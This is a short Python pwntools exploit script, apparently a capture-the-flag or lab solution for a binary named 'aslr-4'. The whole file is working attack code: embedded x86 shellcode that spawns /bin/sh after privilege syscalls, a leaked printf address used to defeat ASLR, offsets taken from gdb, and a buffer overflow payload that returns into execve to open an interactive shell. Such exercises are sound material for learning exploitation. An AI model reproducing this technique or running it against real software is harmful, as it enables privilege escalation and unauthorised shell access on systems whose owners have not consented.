from pwn import *

SHELLCODE ='\xb8\xca\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x801\xc0Phn/shh//bi\x89\xe31\xc91\xd2\xb8\x1b\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1c\xcd\x80'

ARG1 = ''
ENV = {}
OFFSET = 0x00

# Stolen from gdb on sh
execve_gdb = 0xb7eb97e0
printf_gdb = 0xb7e52670
sh_gdb = 0xb7f64a10

# Calculate offsets
execve_offset = execve_gdb - printf_gdb
sh_offset = sh_gdb - printf_gdb

# ENV = {'SHELLCODE': SHELLCODE}
# ARG1 = SHELLCODE

p = process(["aslr-4", ARG1], env=ENV)

# Leak printf address
data = p.recv(0x100)
printf_addr = data.split('\n')[0].split(' ')[14]
printf_addr = int(printf_addr, 16)
print(printf_addr)

# Calculate needed addresses with leaked address
execve_addr = printf_addr + execve_offset
sh_addr = printf_addr + sh_offset

# [0x88 with shellcode][4 bytes garbage][return to execve][4 bytes garbage][arg1(sh)][arg2][arg3]
inp = SHELLCODE + "a" * (0x88+4 - len(SHELLCODE)) + p32(execve_addr) + "bbbb" + p32(sh_addr) + p32(0) + p32(0)
p.send(inp)
p.interactive()
